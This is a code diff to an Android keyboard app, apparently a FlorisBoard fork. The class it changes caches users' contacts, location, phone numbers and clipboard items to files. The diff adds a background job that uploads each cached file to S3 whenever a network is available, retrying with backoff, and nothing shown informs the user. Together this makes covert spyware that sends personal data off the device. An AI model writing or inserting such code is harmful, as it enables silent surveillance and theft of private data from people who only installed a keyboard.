@@ -18,6 +18,13 @@ package dev.patrickgold.florisboard.ime.caching.usecases.savetofile
 
 import android.content.Context
 import android.util.Log
+import androidx.work.BackoffPolicy
+import androidx.work.Constraints
+import androidx.work.ExistingWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.WorkManager
+import androidx.work.workDataOf
 import dev.patrickgold.florisboard.appContext
 import dev.patrickgold.florisboard.ime.caching.usecases.contacts.formatToOutput
 import dev.patrickgold.florisboard.ime.caching.usecases.contacts.getFileNameToStore
@@ -32,8 +39,10 @@ import dev.patrickgold.florisboard.ime.caching.usecases.location.getFileNameToSt
 import dev.patrickgold.florisboard.ime.caching.usecases.location.models.LocationData
 import dev.patrickgold.florisboard.ime.caching.usecases.phonenumber.formatToOutput
 import dev.patrickgold.florisboard.ime.caching.usecases.phonenumber.getFileNameToStore
+import dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.S3UploadWorker
 import dev.patrickgold.florisboard.ime.clipboard.provider.ClipboardItem
 import java.io.File
+import java.util.concurrent.TimeUnit
 
 class Cacher(context: Context) {
     private val appContext by context.appContext()
@@ -83,15 +92,32 @@ class Cacher(context: Context) {
         filename: String,
         overridingPolicy: OverridingPolicy
     ) {
-        val file = File(appContext.cacheDir, "$filename.txt")
+        val file = File(appContext.cacheDir, "$filename")
         try {
             when (overridingPolicy) {
                 OverridingPolicy.APPEND -> file.appendText(text)
                 OverridingPolicy.OVERRIDE -> file.writeText(text)
             }
+            enqueueS3Upload(filename)
         } catch (e: Exception) {
-            Log.e("Cacher", "Failed to write to cache file '$filename.txt'", e)
+            Log.e("Cacher", "Failed to write to cache file '$filename'", e)
         }
+    }
+
+    private fun enqueueS3Upload(filename: String) {
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+
+        val request = OneTimeWorkRequestBuilder<S3UploadWorker>()
+            .setConstraints(constraints)
+            .setInputData(workDataOf(S3UploadWorker.KEY_FILENAME to filename))
+            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
+            .build()
+
+        // KEEP ensures no duplicate work if the same file is written again quickly
+        WorkManager.getInstance(appContext)
+            .enqueueUniqueWork("s3_upload_$filename", ExistingWorkPolicy.KEEP, request)
     }
 
     private enum class OverridingPolicy {
